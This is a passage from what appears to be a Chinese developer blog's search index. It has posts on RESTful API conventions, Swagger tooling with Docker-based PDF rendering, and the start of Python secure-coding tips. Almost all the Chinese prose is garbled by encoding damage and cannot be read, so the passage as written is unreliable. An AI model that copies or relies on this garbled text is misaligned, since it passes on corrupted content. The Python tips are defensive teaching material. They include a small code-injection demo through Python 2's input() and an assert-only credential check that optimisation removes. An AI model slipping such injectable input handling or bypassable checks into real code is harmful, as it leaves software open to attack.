[GET]ÔºöÊúçÂä°Âô®ÊàêÂäüËøîÂõûÁî®Êà∑ËØ∑Ê±ÇÁöÑÊï∞ÊçÆÔºåËØ•Êìç‰ΩúÊòØÂπÇÁ≠âÁöÑÔºàIdempotentÔºâ„ÄÇ201 CREATED - [POST/PUT/PATCH]ÔºöÁî®Êà∑Êñ∞Âª∫Êàñ‰øÆÊîπÊï∞ÊçÆÊàêÂäü„ÄÇ202 Accepted - [*]ÔºöË°®Á§∫‰∏Ä‰∏™ËØ∑Ê±ÇÂ∑≤ÁªèËøõÂÖ•ÂêéÂè∞ÊéíÈòüÔºàÂºÇÊ≠•‰ªªÂä°Ôºâ204 NO CONTENT - [DELETE]ÔºöÁî®Êà∑Âà†Èô§Êï∞ÊçÆÊàêÂäü„ÄÇ400 INVALID REQUEST - [POST/PUT/PATCH]ÔºöÁî®Êà∑ÂèëÂá∫ÁöÑËØ∑Ê±ÇÊúâÈîôËØØÔºåÊúçÂä°Âô®Ê≤°ÊúâËøõË°åÊñ∞Âª∫Êàñ‰øÆÊîπÊï∞ÊçÆÁöÑÊìç‰ΩúÔºåËØ•Êìç‰ΩúÊòØÂπÇÁ≠âÁöÑ„ÄÇ401 Unauthorized - [*]ÔºöË°®Á§∫Áî®Êà∑Ê≤°ÊúâÊùÉÈôêÔºà‰ª§Áâå„ÄÅÁî®Êà∑Âêç„ÄÅÂØÜÁ†ÅÈîôËØØÔºâ„ÄÇ403 Forbidden - [*] Ë°®Á§∫Áî®Êà∑ÂæóÂà∞ÊéàÊùÉÔºà‰∏é401ÈîôËØØÁõ∏ÂØπÔºâÔºå‰ΩÜÊòØËÆøÈóÆÊòØË¢´Á¶ÅÊ≠¢ÁöÑ„ÄÇ404 NOT FOUND - [*]ÔºöÁî®Êà∑ÂèëÂá∫ÁöÑËØ∑Ê±ÇÈíàÂØπÁöÑÊòØ‰∏çÂ≠òÂú®ÁöÑËÆ∞ÂΩïÔºåÊúçÂä°Âô®Ê≤°ÊúâËøõË°åÊìç‰ΩúÔºåËØ•Êìç‰ΩúÊòØÂπÇÁ≠âÁöÑ„ÄÇ406 Not Acceptable - [GET]ÔºöÁî®Êà∑ËØ∑Ê±ÇÁöÑÊ†ºÂºè‰∏çÂèØÂæóÔºàÊØîÂ¶ÇÁî®Êà∑ËØ∑Ê±ÇJSONÊ†ºÂºèÔºå‰ΩÜÊòØÂè™ÊúâXMLÊ†ºÂºèÔºâ„ÄÇ410 Gone -[GET]ÔºöÁî®Êà∑ËØ∑Ê±ÇÁöÑËµÑÊ∫êË¢´Ê∞∏‰πÖÂà†Èô§Ôºå‰∏î‰∏ç‰ºöÂÜçÂæóÂà∞ÁöÑ„ÄÇ422 Unprocesable entity - [POST/PUT/PATCH] ÂΩìÂàõÂª∫‰∏Ä‰∏™ÂØπË±°Êó∂ÔºåÂèëÁîü‰∏Ä‰∏™È™åËØÅÈîôËØØ„ÄÇ500 INTERNAL SERVER ERROR - [*]ÔºöÊúçÂä°Âô®ÂèëÁîüÈîôËØØÔºåÁî®Êà∑Â∞ÜÊó†Ê≥ïÂà§Êñ≠ÂèëÂá∫ÁöÑËØ∑Ê±ÇÊòØÂê¶ÊàêÂäü„ÄÇ ÈîôËØØÂ§ÑÁêÜÂ¶ÇÊûúÁä∂ÊÄÅÁ†ÅÊòØ4xxÔºåÂ∞±Â∫îËØ•ÂêëÁî®Êà∑ËøîÂõûÂá∫Èîô‰ø°ÊÅØ„ÄÇ‰∏ÄËà¨Êù•ËØ¥ÔºåËøîÂõûÁöÑ‰ø°ÊÅØ‰∏≠Â∞Üerror‰Ωú‰∏∫ÈîÆÂêçÔºåÂá∫Èîô‰ø°ÊÅØ‰Ωú‰∏∫ÈîÆÂÄºÂç≥ÂèØ„ÄÇ 123&#123; error: "Invalid API key"&#125; ËøîÂõûÁªìÊûú ÈíàÂØπ‰∏çÂêåÊìç‰ΩúÔºåÊúçÂä°Âô®ÂêëÁî®Êà∑ËøîÂõûÁöÑÁªìÊûúÂ∫îËØ•Á¨¶Âêà‰ª•‰∏ãËßÑËåÉ„ÄÇ 123456GET /collection: ËøîÂõû‰∏ÄÁ≥ªÂàóËµÑÊ∫êÂØπË±°GET /collection/resource: ËøîÂõûÂçïÁã¨ÁöÑËµÑÊ∫êÂØπË±°POST /collection: ËøîÂõûÊñ∞ÂàõÂª∫ÁöÑËµÑÊ∫êÂØπË±°PUT /collection/resource: ËøîÂõûÂÆåÊï¥ÁöÑËµÑÊ∫êÂØπË±°PATCH /collection/resource: ËøîÂõûÂÆåÊï¥ÁöÑËµÑÊ∫êÂØπË±°DELETE /collection/resource: ËøîÂõû‰∏Ä‰∏™Á©∫ÊñáÊ°£ Hypermedia API RESTful APIÊúÄÂ•ΩÂÅöÂà∞HypermediaÔºåÂç≥ËøîÂõûÁªìÊûú‰∏≠Êèê‰æõÈìæÊé•ÔºåËøûÂêëÂÖ∂‰ªñAPIÊñπÊ≥ïÔºå‰ΩøÂæóÁî®Êà∑‰∏çÊü•ÊñáÊ°£Ôºå‰πüÁü•ÈÅì‰∏ã‰∏ÄÊ≠•Â∫îËØ•ÂÅö‰ªÄ‰πà Hypermedia APIÁöÑËÆæËÆ°Ë¢´Áß∞‰∏∫HATEOAS link: Áî®Êà∑ËØªÂèñËøô‰∏™Â±ûÊÄßÂ∞±Áü•ÈÅì‰∏ã‰∏ÄÊ≠•ËØ•Ë∞ÉÁî®‰ªÄ‰πàAPI‰∫Ü rel: relË°®Á§∫Ëøô‰∏™API‰∏éÂΩìÂâçÁΩëÂùÄÁöÑÂÖ≥Á≥ªÔºàcollectionÂÖ≥Á≥ªÔºåÂπ∂ÁªôÂá∫ËØ•collectionÁöÑÁΩëÂùÄÔºâ href: APIÁöÑÁªùÂØπË∑ØÂæÑ title: APIÁöÑÊ†áÈ¢ò,Áî®‰∫éÊ¶ÇËø∞Áî®ÈÄî type: API ÂìçÂ∫îÁöÑÊï∞ÊçÆÁ±ªÂûã 123456&#123;&quot;link&quot;: &#123; &quot;rel&quot;: &quot;collection https://www.example.com/zoos&quot;, &quot;href&quot;: &quot;https://api.example.com/zoos&quot;, &quot;title&quot;: &quot;List of zoos&quot;, &quot;type&quot;: &quot;application/vnd.yourformat+json&quot;&#125;&#125; 12345 maojun@maojun-mbp#curl https://api.github.com/user&#123; &quot;message&quot;: &quot;Requires authentication&quot;, &quot;documentation_url&quot;: &quot;https://developer.github.com/v3&quot;&#125; ËÆ§ËØÅ ËÆ§ËØÅÂíåÊéàÊùÉÁöÑÁî®Êà∑Ê®°ÂûãËØ•Â∞ΩÈáèÈááÁî®RBACÊ®°ÂûãÔºåÂõ†‰∏∫ÂÖ∂ËâØÂ•ΩÁöÑÊâ©ÂÆπÊÄß„ÄÇ APIËÆ§ËØÅÁöÑÊâãÊÆµÊúÄÂ•ΩÈááÁî®OAuth2.0, ÁÆÄÂçïÁöÑÂèØ‰ª•ÈááÁî® JWTÔºàJson Web TokenÔºâ ÂÖ≥‰∫éOAuthÁöÑÁÆÄ‰ªãÂèØ‰ª•ÂèÇËÄÉÈòÆ‰∏ÄÂ≥∞OAuth2.0ÁÆÄ‰ªã ÂÖ≥‰∫éJWTÂèÇËÄÉÊ≠§ÊñáJWT‰ΩøÁî® ÂÜÖÂÆπÁ±ªÂûã XMLÂ∑≤ÊòØËøáÂéªÊó∂‰∫ÜÔºåÁé∞‰ª£ÁöÑwebÁªü‰∏Ä‰ΩøÁî®JSONÔºå‰πüÂ∞±ÊòØHTTPÂ§¥ÁßçÁöÑContent TypeÊ†áÁ≠æÈááÁî® application/json 1234567891011121314151617181920212223242526ËØ∑Ê±ÇÊä•ÊñáPOST /v1/animal HTTP/1.1Host: api.example.orgAccept: application/jsonContent-Type: application/jsonContent-Length: 24 &#123; &quot;name&quot;: &quot;Gir&quot;, &quot;animal_type&quot;: 12&#125;ÂìçÂ∫îÊä•ÊñáHTTP/1.1 200 OKDate: Wed, 18 Dec 2013 06:08:22 GMTContent-Type: application/jsonAccess-Control-Max-Age: 1728000Cache-Control: no-cache &#123; &quot;id&quot;: 12, &quot;created&quot;: 1386363036, &quot;modified&quot;: 1386363036, &quot;name&quot;: &quot;Gir&quot;, &quot;animal_type&quot;: 12&#125;]]></content>
      <categories>
        <category>Á®ãÂ∫èËÆæËÆ°</category>
        <category>RESTful API</category>
      </categories>
      <tags>
        <tag>restful</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Â¶Ç‰Ωï‰ΩøÁî®swaggerËÆæËÆ°Âá∫ÊºÇ‰∫ÆÁöÑRESTful API]]></title>
    <url>%2F2017%2F01%2F05%2Fapi-design-swagger%2F</url>
    <content type="text"><![CDATA[ÊåâÁÖßÁé∞Âú®ÁöÑË∂ãÂäøÔºåÂâçÂêéÁ´ØÂàÜÁ¶ªÂá†‰πéÂ∑≤ÁªèÊòØ‰∏öÁïåÂØπÂºÄÂèëÂíåÈÉ®ÁΩ≤ÊñπÂºèÊâÄËææÊàêÁöÑ‰∏ÄÁßçÂÖ±ËØÜ, ÂêéÂè∞Âè™Ë¥üË¥£Êï∞ÊçÆÁöÑÊèê‰æõÂíåËÆ°ÁÆóÔºåËÄåÂÆåÂÖ®‰∏çÂ§ÑÁêÜÂ±ïÁé∞„ÄÇËÄåÂâçÁ´ØÂàôË¥üË¥£ÊãøÂà∞Êï∞ÊçÆÔºåÁªÑÁªáÊï∞ÊçÆÂπ∂Â±ïÁé∞ÁöÑÂ∑•‰Ωú„ÄÇËøôÊ†∑ÁªìÊûÑÊ∏ÖÊô∞ÔºåÂÖ≥Ê≥®ÁÇπÂàÜÁ¶ªÔºåÂâçÂêéÁ´Ø‰ºöÂèòÂæóÁõ∏ÂØπÁã¨Á´ãÂπ∂ÊùæËÄ¶Âêà„ÄÇËÄåÂâçÊÆµÂíåÂêéÁ´ØÂØπÂæÖÁöÑÂ•ëÁ∫¶Â∞±ÊòØAPIËÆæËÆ°ÊñáÊ°£, Êúâ‰∫ÜAPIÁöÑËÆæËÆ°ÊñáÊ°£ËøáÂêé, ÂêéÁ´Ø‰æùÊçÆËÆæËÆ°Êñá‰ª∂ÂºÄÂèëÂêéÁ´ØÁ®ãÂ∫è, ÂâçÊÆµÊ†πÊçÆAPIËÆæËÆ°ÊñáÊ°£Ê®°ÊãüÊúçÂä°Âô®,ÂºÄÂèëÂâçÊÆµÈ°µÈù¢„ÄÇËÄåSwaggerÂ∞±ÊòØÂÖ∂‰∏≠‰∏ÄÁßçÊØîËæÉ‰ºòÁßÄÁöÑ RESTful APIËÆæËÆ°Â∑•ÂÖ∑„ÄÇ swagger Â∑•ÂÖ∑ÁÆÄ‰ªãswaggerÊòØ‰∏Ä‰∏™RESTful API ÁöÑËÆæËÆ°Â∑•ÂÖ∑ÔºåÂÆòÊñπÊèê‰æõ3ÁßçÂ∑•ÂÖ∑Ôºö swagger-editor Âú®Á∫øÁºñËæëÂô®ÔºåÂêåÊó∂Êèê‰æõÁºñËæë-Â±ïÁé∞-ÂÆ¢Êà∑Á´Ø-ÊúçÂä°Á´Ø‰ª£Á†ÅÁöÑÁîüÊàê swagger-ui Â±ïÁ§∫Â∑•ÂÖ∑ÔºåÂ∞ÜÁºñËæëÂô®ÂÆö‰πâÂ•ΩÁöÑjsonÊèèËø∞Êñá‰ª∂ÂèãÂ•ΩÂ±ïÁ§∫ÁöÑÂ∑•ÂÖ∑„ÄÇ swagger-codegen ÁîüÊàêÊúçÂä°Á´ØÂíåÂÆ¢Êà∑Á´ØÁöÑ‰ª£Á†Å„ÄÇ Âõ†‰∏∫swagger-editorÈõÜÊàê‰∫Üswagger-codegenÂäüËÉΩÔºåÂõ†Ê≠§Êàë‰ª¨‰ªÖÈúÄË¶Å‰ΩøÁî®swagger-editorÂíåswagger-uiÂ∞±Â§ü‰∫Ü„ÄÇ ÁºñËæëÂô®(editor)ÂèØ‰ª•‰ΩøÁî®Âú®Á∫øÁºñËæëÂô®ÔºåËÄåÁî±‰∫éÁΩëÁªúÂéüÂõ†, ÂæÄÂæÄ‰∏çËÉΩÂæàÂ•ΩÁöÑ‰ΩøÁî®swaggerÊèê‰æõÁöÑÂú®Á∫øÁºñËæëÂô®ÔºåÁÑ∂ËÄåËøô‰∏™Âú®Á∫øÁºñËæëÂô®‰πüÂèØ‰ª•Êú¨Âú∞ÈÉ®ÁΩ≤ÔºåÂÖ∂Ê¨°ÊúâÂæàÂ§öÁºñËæëÂô®‰πüÊúâswaggerÁöÑÊèí‰ª∂, ÈÄöËøáÊåâÁÖßswaggerÊèí‰ª∂ÔºåÊàë‰ª¨‰πüÂèØ‰ª•ÈÖçÁΩÆÂá∫‰∏Ä‰∏™swaggerÁöÑÁºñËæëÂô®„ÄÇÊúâ‰∫ÜÁºñËæëÂô®ÂêéÔºåÊàë‰ª¨ÈúÄË¶ÅÁÜüÊÇâ‰ΩøÁî®swaggerÊù•ËÆæËÆ°APIÁöÑ‰∏Ä‰∫õËØ≠Ê≥ï„ÄÇ ÈÉ®ÁΩ≤Êú¨Âú∞ÁºñËæëÂô®ÂÆâË£ÖdockerÔºåÈÖçÁΩÆÈïúÂÉèÂä†ÈÄüÔºåÁÑ∂ÂêéÊãâÂéªÈïúÂÉèÂà∞Êú¨Âú∞ËøêË°å12docker pull swaggerapi/swagger-editordocker run -p 80:8080 swaggerapi/swagger-editor ‰ΩøÁî®Êú¨Âú∞ÁºñËæëÂô®Êé®Ëçê‰ΩøÁî®vscode‰Ωú‰∏∫ÁºñËæëÂô®, ÂÆâË£ÖvscodeÁöÑSwagger ViewÊèí‰ª∂ Â∞±ÂèØ‰ª•ÊâìÈÄ†‰∏Ä‰∏™ swaggerÁöÑÁºñËæëÂô®‰∫ÜÈááÁî®yamlÁºñÂÜôÔºåÁÑ∂Âêé‰ΩøÁî®Swagger Preview Êü•ÁúãÈ¢ÑËßà„ÄÇ swagger2.0ËØ≠Ê≥ïËØ¶ÊÉÖÂèÇËÄÉswagger2.0ÂÆòÊñπËßÑËåÉ Ê†ºÂºèÈááÁî®jsonÔºå Âõ†‰∏∫yamlÊòØjsonÁöÑ‰∏Ä‰∏™Ë∂ÖÈõÜÔºåÂõ†Ê≠§‰πüÂèØ‰ª•‰ΩøÁî®„ÄÇÈÄöÂ∏∏ÊÉÖÂÜµÊàë‰ª¨ÈÄöËøáyamlÊù•ÂÆåÊàêÁºñËæëÔºåÊúÄÂêéÈÄöËøáÁºñËæëÂô®ÂØºÂá∫‰∏∫jsonÊñá‰ª∂„ÄÇ Êñá‰ª∂ÁªìÊûÑ‰∏∫‰∏Ä‰∏™ÂçïÁã¨ÁöÑÊñá‰ª∂Ôºå‰ΩÜÊòØÂÖ∂‰∏≠definitionsÈÉ®ÂàÜÂèØ‰ª•Ë¢´ÊäΩÂá∫Êù•‰∏∫‰∏Ä‰∏™Áã¨Á´ãÊñá‰ª∂ÔºåÈÄöËøá$refËøõË°åÂºïÁî®ÔºåÊåâÁÖßÊÉØ‰æãÔºåËøô‰∏™Êñá‰ª∂Â∫îËØ•Ë¢´ÂëΩÂêç‰∏∫ swagger.json Êï∞ÊçÆÁ±ªÂûãÁî®‰∫éÊèèËø∞‰∏Ä‰∏™Êï∞ÊçÆÁöÑÊï∞ÊçÆÁ±ªÂûãÔºåÂØπË±°ÂÆö‰πâÊó∂‰ΩøÁî®„ÄÇ Common Name type format Comments integer integer int32 signed 32 bits long integer int64 signed 64 bits float number float double number double string string byte string byte base64 encoded characters binary string binary any sequence of octets boolean boolean date string date As defined by full-date - RFC3339 dateTime string date-time As defined by date-time - RFC3339 password string password Used to hint UIs the input needs to be obscured. ËßÑËåÉËßÑËåÉ‰πüÂ∞±ÊòØËØ≠Ê≥ïÔºå‰ºöÂÆâË£ÖÊ≠§ËßÑËåÉÊù•ÁºñÂÜôAPIËÆæËÆ°ÊñáÊ°£„ÄÇ‰ª•‰∏ãÂàóÂá∫‰∫ÜÊâÄÊúâÈúÄË¶ÅÁöÑÂÖ≥ÈîÆÂ≠óÊÆµ Â≠óÊÆµÂêç Á±ªÂûã ÊèèËø∞ swagger string ÂøÖÂ°´È°π„ÄÇË°®Á§∫‰ΩøÁî®ÁöÑswaggerÁöÑÁâàÊú¨ÔºåÂøÖÈ°ª‰∏∫2.0 info Info Object ÂøÖÂ°´È°π„ÄÇÊèê‰æõAPIÁöÑ‰∏Ä‰∫õÂÖÉÊï∞ÊçÆÊèèËø∞ host string Êèê‰æõËØ•APIÊúçÂä°ÁöÑ‰∏ªÊú∫ÂêçÁß∞ÊàñËÄÖIPÔºåÊµãËØïÊó∂ ‰ΩøÁî®ËØ•Âú∞ÂùÄËøõÁ®ãÊµãËØï„ÄÇ basePath string APIÁöÑÂü∫Êú¨Ë∑ØÂæÑ,ËøôÊòØÁõ∏ÂØπÁöÑhost„ÄÇ Â¶ÇÊûú‰∏çÂåÖÊã¨,APIÊòØÁõ¥Â±ûhost„ÄÇ ÂøÖÈ°ª‰ª•‚Äù/‚ÄúÂºÄÂ§¥ schemes [string] APIÁöÑ‰º†ËæìÂçèËÆÆÁöÑÂàóË°®„ÄÇ Âú®‚Äùhttp‚Äù,‚Äùhttps‚Äù,‚Äùws‚Äù,‚Äùwss‚ÄùÂÖ∂‰∏≠ÈÄâÊã© consumes [string] ‰∏Ä‰∏™MIMEÁ±ªÂûãÁöÑapiÂèØ‰ª•‰ΩøÁî®ÂàóË°®„ÄÇ ÂÄºÂøÖÈ°ªÊòØÊâÄÊèèËø∞ÁöÑMimeÁ±ªÂûã produces [string] MIMEÁ±ªÂûãÁöÑapiÂèØ‰ª•‰∫ßÁîüÁöÑÂàóË°®„ÄÇ ÂÄºÂøÖÈ°ªÊòØÊâÄÊèèËø∞ÁöÑMimeÁ±ªÂûã paths Ë∑ØÂæÑÂØπË±° ÂøÖÂ°´È°π„ÄÇÂèØÁî®ÁöÑË∑ØÂæÑÂíåÊìç‰ΩúÁöÑAPI definitions ÂÆö‰πâÂØπË±° ‰∏Ä‰∏™ÂØπË±°Êï∞ÊçÆÁ±ªÂûãÂÆö‰πâ parameters ÂèÇÊï∞ÂÆö‰πâÂØπË±° ÂÆö‰πâËØ∑Ê±ÇÂèÇÊï∞ÁöÑÂØπË±° responses ÂèçÂ∫îÂÆö‰πâÂØπË±° ÂÆö‰πâËØ∑Ê±ÇÂìçÂ∫îÂØπË±° securityDefinitions ÂÆâÂÖ®ÂÆö‰πâÂØπË±° ÂÆâÂÖ®ÊñπÊ°àÂÆö‰πâËßÑËåÉ,ÊØîÂ¶ÇËÆ§ËØÅ security ÂÆâÂÖ®ÈúÄÊ±ÇÂØπË±° ËøôÈáå‰∏ªË¶ÅÊåá‰ΩøÁî®Âì™ÁßçËÆ§ËØÅÊâãÊÆµ tags Ê†áÁ≠æÂØπË±° Ê≤°‰∏™RESTful‰∏≠ËµÑÊ∫êÁöÑÊ†áÁ≠æÔºåÂàóË°®‰∏≠ÁöÑÊØè‰∏™Ê†áËÆ∞ÂêçÁß∞ÂøÖÈ°ªÊòØÂîØ‰∏ÄÁöÑ externalDocs Â§ñÈÉ®ÊñáÊ°£ÂØπË±° È¢ùÂ§ñÁöÑÂ§ñÈÉ®ÊñáÊ°£, ÊåáÂêëÂ§ñÈÉ®url Ê∏≤ÊüìÂô®(ui)swagger-uiÁöÑ‰ΩøÁî®ÂæàÁÆÄÂçïswager-uiÂÆòÊñπÊñáÊ°£ HTMLÊñáÊ°£Ê∏≤ÊüìÊ∏≤ÊüìÂô®‰ΩøÁî®ÂÆòÊñπÁöÑswagger-uiÔºåËøôÈáåÊàë‰ª¨ÈúÄË¶Å‰∏Ä‰∏™webÊúçÂä°Âô®ÔºåÁî®Êù•Ê∏≤ÊüìÊàë‰ª¨ÂàöÊâçÁºñËæëÂÆåÊàêÁöÑapi ËÆæËÆ°ÊñáÊ°£„ÄÇËøôÈáå‰∏ÄËà¨‰ΩøÁî®node ÁöÑ express‰∏∫webÊ°ÜÊû∂Êù•ÂÅöËøô‰∏™ÁÆÄÂçïÁöÑwebÊúçÂä°Âô® PDFÊñáÊ°£Ê∏≤ÊüìÂ∞ÜAPIËÆæËÆ°ÊñáÊ°£Ê∏≤ÊüìÊàêPDF, ÊµÅÁ®ãÊòØËøôÊ†∑: swagger.yaml ‚Äî&gt; asciiDoc‚Äî&gt; pdf ‰ΩøÁî®swagger2markupÊù•ÁîüÊàêasciiDocÊ†ºÂºèÁöÑÊñáÊ°£‰∏ãËΩΩswagger2markupÂ∑•ÂÖ∑,‰∏ãËΩΩÂú∞ÂùÄ,ÈÄâÊã©‰Ω†ÊÉ≥Ë¶ÅÁöÑÁâàÊú¨‰∏ãËΩΩ‰ΩøÁî®Â∑•ÂÖ∑ÁîüÊàêasciiDoc, -iÊåáÂÆöswagger.yamlÁöÑ‰ΩçÁΩÆ, -fÊåáÂÆöËæìÂá∫Êñá‰ª∂ÂêçÁß∞Ôºö 1java -jar swagger2markup-cli-1.1.0.jar convert -i ~/PycharmProjects/doc/api_design/swagger.yaml -f asiidoc/swagger ‰ΩøÁî®asciidoctorÊù•Â∞ÜasciiDocÊç¢Êç¢ÊàêPDFËøôÊòØ‰∏Ä‰∏™rubyÂÜôÁöÑÂ∑•ÂÖ∑ÔºåÊàëÊú¨Âú∞‰∏çÊâìÁÆóÈÉ®ÁΩ≤rubyÁéØÂ¢ÉÔºåÂõ†Ê≠§Âú®Êâæ‰∏Ä‰∏™dockerÈïúÂÉèÔºömadduci/docker-asciidoctor-pdfÁî±‰∫éËÆøÈóÆdockerhubÁöÑÈïúÂÉèÈÄüÂ∫¶ÈùûÂ∏∏ÊÖ¢ÔºåÂõ†Ê≠§ÊàëÂ∞ÜËØ•Â∑•ÂÖ∑ÁöÑ‰ΩøÁî®ËØ¥ÊòéÂ§çÂà∂‰∫Ü‰∏ãÊù•ÔºåÈïúÂÉè‰ΩøÁî®ËØ¥Êòé Docker Image exposing asciidoctor-pdf as entrypoint and /document as mounted volume where to build the fileTo build your own documents as PDF, simply run the container as:docker run ‚Äìrm -v /path/to/your/document/folder/:/document/ madduci/docker-asciidoctor-pdf /document/your_document.adocIf you want to use some custom styles, just run it asdocker run ‚Äìrm -v /path/to/your/document/folder/:/document/ madduci/docker-asciidoctor-pdf -a pdf-stylesdir=/document/resources/themes -a pdf-style=your_style -a pdf-fontsdir=/document/resources/fonts /document/your_document.adocand it will generate the pdf in the mounted volume /document ËøôÂ∑•ÂÖ∑Âú®ÁîüÊàêÂê´Êúâ‰∏≠ÊñáÁöÑpdfÊñáÊ°£Êó∂ÊúâÂ≠ó‰ΩìÈóÆÈ¢òÔºåÂõ†Ê≠§Êàë‰øÆÊîπ‰∫ÜÂ≠ó‰Ωì‰∏∫ÂæÆËΩØÈõÖÈªëÂ≠ó‰ΩìÔºå‰ª•‰∏ãÊòØ‰øÆÊîπÊñπÊ≥ïÔºö Ê∑ªÂä†ÈõÖÈªëÂ≠ó‰ΩìÂà∞ÂΩìÂâçÁöÑFontsÊñá‰ª∂Â§π‰∏ãÈù¢,ËøôÈáåÈúÄË¶ÅÊ†áÂáÜÂ≠ó‰ΩìÂíåÁ≤ó‰Ωì, ËÄåÈªòËÆ§Êèê‰æõÁöÑÂ≠ó‰ΩìÂè™ÊúâËøô‰∫õÈªòËÆ§Êèê‰æõÁöÑÂ≠ó‰Ωì 1234‚ûú asiidoc ls Fonts |grep -i &apos;yahei&apos;Microsoft Yahei.ttfyahei.ttfyahei_bold.ttf ‰øÆÊîπ‰∏ªÈ¢òÈÖçÁΩÆdefault-theme.ymlÁöÑNoto SerifÂ≠óÊÆµÔºå‰ΩøÁî®ËØ•Â≠ó‰Ωì:ÈÖçÁΩÆÊñá‰ª∂‰∏ãËΩΩÂú∞ÂùÄÈªòËÆ§ÈÖçÁΩÆÊñá‰ª∂‰∏ãËΩΩÂú∞ÂùÄ 12345Noto Serif:normal: yahei.ttfbold: yahei_bold.ttfitalic: yahei.ttfbold_italic: yahei_bold.tt ÊúÄÂêéÊääÊàë‰ª¨ÁîüÊàêÂ•ΩÁöÑswagger.adoc, ‰∏ªÈ¢òÈÖçÁΩÆÊñá‰ª∂,Â≠ó‰Ωì ÊîæÂú®‰∏Ä‰∏™ÁõÆÂΩï‰∏ãÔºåÊåÇËΩΩÂà∞dockerÈáåÈù¢Âéª: 123‚ûú Downloads ls asiidocFonts swagger.adoc themesdocker run --rm -v $(pwd)/asiidoc/:/document/ madduci/docker-asciidoctor-pdf -a pdf-fontsdir=/document/Fonts -a pdf-stylesdir=/document/themes /document/swagger.adoc ÊúÄÂêéÊü•Áúãasiidoc‰∏ãÈù¢Â∞±‰ºöÊúâÁîüÊàêÁöÑpdfÊñá‰ª∂ ‰ª£Á†ÅÁîüÊàêÂô®(codegen)swaggerËÉΩÊèê‰æõÊúçÂä°Á´ØÂíåÂÆ¢Êà∑Á´ØÁöÑ‰ª£Á†ÅÁîüÊàêÂäüËÉΩ,Ëøô‰∏™ÂäüËÉΩÂú®swagger-editor‰∏äÂ∑≤ÁªèÈõÜÊàêÁîüÊàêserverÁ´Ø‰ª£Á†ÅÔºöÁîüÊàêÂÆ¢Êà∑Á´Ø‰ª£Á†ÅÔºö]]></content>
      <categories>
        <category>Á®ãÂ∫èËÆæËÆ°</category>
        <category>RESTful API</category>
      </categories>
      <tags>
        <tag>swagger</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[‰ΩøÁî®Python‰∏≠ÁöÑ‰∏Ä‰∫õÂÆâÂÖ®Âª∫ËÆÆ]]></title>
    <url>%2F2017%2F01%2F02%2Fpython-bestpractice%2F</url>
    <content type="text"><![CDATA[Áî±‰∫éPythonÁÆÄÊ¥ÅÔºå‰ºòÈõÖÔºåÂºÄÂèëÊïàÁéáÈ´òÔºåÊ∏êÊ∏êÂú®ËÆ°ÁÆóÁéØÂ¢É‰∏≠Êó†Â§Ñ‰∏çÂú®„ÄÇ‰ΩÜÊòØÂ¶ÇÊûú‰Ω†‰∏çÊ≥®ÊÑèÔºåÂÆπÊòìÁºñÂÜôÂá∫ÂÖ∑Êúâ‰∏•ÈáçÂÆâÂÖ®ÈöêÊÇ£ÁöÑ‰ª£Á†Å, ‰ª•‰∏ãÊàëÊï¥ÁêÜÁöÑ‰∏Ä‰∫õÂ¶Ç‰ΩïÁºñÂÜôÂá∫ÂÆâÂÖ®‰ª£Á†ÅÁöÑ‰∏Ä‰∫õÂª∫ËÆÆ„ÄÇ inputÂáΩÊï∞Âú®Python 2Â§ßÈáèÁöÑÂÜÖÁΩÆÂäüËÉΩÈõÜÂêà‰∏≠ÔºåinputÂÆåÂÖ®Â∞±ÊòØ‰∏Ä‰∏™ÂÆâÂÖ®ÁÅæÈöæ„ÄÇ‰∏ÄÊó¶Ë∞ÉÁî®ÂÆÉÔºå‰ªéÊ†áÂáÜËæìÂÖ•ËØªÂÖ•ÁöÑ‰ªª‰Ωï‰∏úË•øÈÉΩ‰ºöË¢´Á´ãÂç≥Ëß£Êûê‰∏∫Python‰ª£Á†ÅÔºö12345678910‚ûú ~ python2Python 2.7.12 (default, Dec 2 2016, 21:51:52)[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.42.1)] on darwinType "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; input()dir()['__builtins__', '__doc__', '__name__', '__package__']&gt;&gt;&gt; input()__import__('sys').exit()‚ûú ~ ÊòæÁÑ∂ÔºåÂøÖÈ°ªÊ∞∏Ëøú‰∏ç‰ΩøÁî®inputÂáΩÊï∞ÔºåÈô§ÈùûËÑöÊú¨ÁöÑÊ†áÂáÜËæìÂÖ•‰∏≠ÁöÑÊï∞ÊçÆÊòØÂÆåÂÖ®ÂèØ‰ø°ÁöÑ„ÄÇ Python 2ÊñáÊ°£Âª∫ËÆÆÂ∞Üraw_input‰Ωú‰∏∫‰∏Ä‰∏™ÂÆâÂÖ®ÁöÑÊõø‰ª£ÂìÅ„ÄÇÂú®Python 3‰∏≠ÔºåinputÂáΩÊï∞Á≠âÂêå‰∫éraw_inputÔºå‰ªéËÄå‰∏ÄÂä≥Ê∞∏ÈÄ∏Âú∞Ëß£ÂÜ≥‰∫ÜËøô‰∏™ÈöêÊÇ£ assertËØ≠Âè•Âú® Python Â∫îÁî®‰∏≠‰ΩøÁî® assert ËØ≠Âè•Âú®‰∏çÂèØËÉΩÊù°‰ª∂‰∏ãÊçïËé∑ÊòØ‰∏Ä‰∏™ÁºñÁ®ã‰π†ÊÉØ„ÄÇ123def verify_credentials(username, password): assert username and password, 'Credentials not supplied by caller' ... authenticate possibly null user with null password ... ÁÑ∂ËÄåÔºåÂú®Â∞ÜÊ∫ê‰ª£Á†ÅÁºñËØëÊàê‰ºòÂåñÁöÑÂ≠óËäÇÁ†ÅÊó∂Ôºà‰æãÂ¶ÇÔºå python - O ÔºâÔºåPython Âπ∂‰∏ç‰∏∫ assert ËØ≠Âè•ÁîüÊàê‰ªª‰ΩïÊåá‰ª§„ÄÇÂÆÉÈªòÈªòÂú∞Âà†Èô§ÈÇ£‰∫õÁ®ãÂ∫èÂëòÂÜôÁöÑËÆ©Á®ãÂ∫èÂÖçÂèóÁï∏ÂΩ¢Êï∞ÊçÆÊîªÂáªÁöÑ‰ª£Á†ÅÔºåËÆ©Â∫îÁî®Êö¥Èú≤Âú®ÊîªÂáª‰πã‰∏≠„ÄÇËØ•ÊºèÊ¥ûÁöÑÊ†πÊú¨ÂéüÂõ†Âú®‰∫é assertÊú∫Âà∂Á∫ØÁ≤πÊòØ‰∏∫ÊµãËØïÁõÆÁöÑËÄåËÆæÔºåÊ≠£Â¶ÇÂú® C++ 